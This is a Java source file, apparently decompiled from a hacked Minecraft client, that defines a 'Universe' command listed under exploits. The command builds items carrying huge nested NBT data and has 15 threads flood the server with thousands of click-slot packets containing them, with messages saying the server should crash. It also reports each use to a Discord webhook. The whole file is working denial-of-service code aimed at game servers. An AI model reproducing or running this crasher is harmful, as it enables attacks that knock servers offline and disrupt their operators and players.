package org.jon.magicclient.client.commands;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2495;
import net.minecraft.class_2499;
import net.minecraft.class_2561;
import net.minecraft.class_2813;
import net.minecraft.class_310;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionUtil;

public class UniverseCrash implements Command {
   private boolean running = false;
   private boolean enabled = false;
   private final List<Thread> crashThreads = new CopyOnWriteArrayList();

   public String getName() {
      return "Universe";
   }

   public String getDescription() {
      return "Massive multi-threaded NBT crasher";
   }

   public String getArgsUsage() {
      return "";
   }

   public boolean getEnabled() {
      return this.enabled;
   }

   public void setEnabled(boolean bool) {
      this.enabled = bool;
   }

   public List<OptionUtil> getOptions() {
      return new ArrayList();
   }

   public GuiCategory getCategory() {
      return GuiCategory.EXPLOITS;
   }

   public void onCommand(String[] args) {
      if (args.length == 1) {
         if (!this.running) {
            this.start();
         } else {
            this.stop();
            this.sendMessage("§c[Universe] Gestoppt!", true);
         }

      } else {
         if (this.running) {
            this.stop();
            this.sendMessage("§c[Universe] Gestoppt!", true);
         } else {
            this.start();
         }

      }
   }

   private void start() {
      class_310 mc = class_310.method_1551();
      if (mc != null && mc.field_1724 != null && mc.method_1562() != null) {
         this.running = true;
         this.sendMessage("§c[Universe] ATTACK STARTET", true);
         DiscordWebhookSender.sendCrasherActivation("universe", "Massive multi-threaded NBT crasher");
         this.sendMessage("§c[Universe] Attack finished!", true);
         Thread mainThread = new Thread(() -> {
            try {
               class_1799[] leatherItems = new class_1799[]{new class_1799(class_1802.field_8267), new class_1799(class_1802.field_8577), new class_1799(class_1802.field_8570), new class_1799(class_1802.field_8370)};

               for(int itemIndex = 0; itemIndex < leatherItems.length; ++itemIndex) {
                  class_2487 rootCompound = new class_2487();
                  class_2487 displayCompound = new class_2487();
                  class_2499 colorsList = new class_2499();
                  int[] colors = new int[960];

                  for(int k = 0; k < 35000; ++k) {
                     for(int ix = 0; ix < colors.length; ++ix) {
                        colors[ix] = (k + itemIndex) * 10500 + ix;
                     }

                     class_2487 colorTag = new class_2487();
                     colorTag.method_10566("Colors", new class_2495(colors));
                     colorsList.add(colorTag);
                  }

                  displayCompound.method_10566("Colors", colorsList);
                  class_2487 extraCompound = new class_2487();
                  class_2499 extraList = new class_2499();

                  for(int nested = 0; nested < 2500; ++nested) {
                     class_2487 nestedTag = new class_2487();
                     int[] nestedData = new int[960];

                     for(int i = 0; i < nestedData.length; ++i) {
                        nestedData[i] = nested * 15000 + i + itemIndex;
                     }

                     nestedTag.method_10566("Data_" + nested, new class_2495(nestedData));
                     extraList.add(nestedTag);
                  }

                  extraCompound.method_10566("ExtraLayer", extraList);
                  rootCompound.method_10566("display", displayCompound);
                  rootCompound.method_10566("ExtraData", extraCompound);
                  leatherItems[itemIndex].method_7980(rootCompound);
               }

               int threadCount = 15;

               for(int t = 0; t < threadCount; ++t) {
                  Thread crashThread = new Thread(() -> {
                     try {
                        Int2ObjectMap<class_1799> itemMap = new Int2ObjectOpenHashMap();
                        itemMap.put(Integer.MAX_VALUE, leatherItems[0]);
                        itemMap.put(Integer.MIN_VALUE, leatherItems[1]);
                        itemMap.put(-999999999, leatherItems[2]);
                        itemMap.put(999999999, leatherItems[3]);
                        int packetsPerThread = 8000;
                        class_1713[] actionTypes = new class_1713[]{class_1713.field_7790, class_1713.field_7794, class_1713.field_7791};

                        for(int i = 0; i < packetsPerThread && this.running && mc.method_1562() != null; ++i) {
                           try {
                              class_1713 actionType = actionTypes[(int)(Math.random() * (double)actionTypes.length)];
                              int randomSlot = (int)(Math.random() * 75.0D);
                              int randomButton = (int)(Math.random() * 10.0D);
                              class_1799 selectedItem = leatherItems[i % 9];
                              class_2813 packet = new class_2813(0, t * 200000 + i, randomSlot, randomButton, actionType, selectedItem, itemMap);
                              mc.method_1562().method_2883(packet);
                              if (i % 1000 == 0 && i > 0) {
                                 Thread.sleep(1L);
                              }

                              if (i % 10000 == 0 && i > 0) {
                                 mc.execute(() -> {
                                    this.sendMessage("§c[Thread-" + t + "] " + i + "/5250", true);
                                 });
                              }
                           } catch (Exception var14) {
                           }
                        }
                     } catch (Exception var15) {
                     }

                  }, "UniverseCrash-Thread-" + t);
                  this.crashThreads.add(crashThread);
                  crashThread.start();
               }

               Thread.sleep(2000L);
               mc.execute(() -> {
                  this.sendMessage("§c[Universe] 52500 PACKETS WERDEN GESENDET!", true);
                  this.sendMessage("§c[Universe] SERVER SOLLTE JETZT CRASHEN...", true);
                  DiscordWebhookSender.sendCrasherCompletion("universe", "Massive multi-threaded NBT crasher", true);
               });
            } catch (Exception var14) {
               mc.execute(() -> {
                  this.sendMessage("§c[Universe] Error: " + var14.getMessage(), true);
               });
            }

         }, "UniverseCrash-Main");
         this.crashThreads.add(mainThread);
         mainThread.start();
      }
   }

   private void stop() {
      this.running = false;
      Iterator var1 = this.crashThreads.iterator();

      while(var1.hasNext()) {
         Thread thread = (Thread)var1.next();
         if (thread != null && thread.isAlive()) {
            thread.interrupt();
         }
      }

      this.crashThreads.clear();
      DiscordWebhookSender.sendCrasherCompletion("universe", "Massive multi-threaded NBT crasher", true);
   }

   private void sendMessage(String text, boolean overlay) {
      class_310 mc = class_310.method_1551();
      if (mc != null && mc.field_1724 != null) {
         mc.field_1724.method_7353(class_2561.method_43470(text), overlay);
      }

   }
}
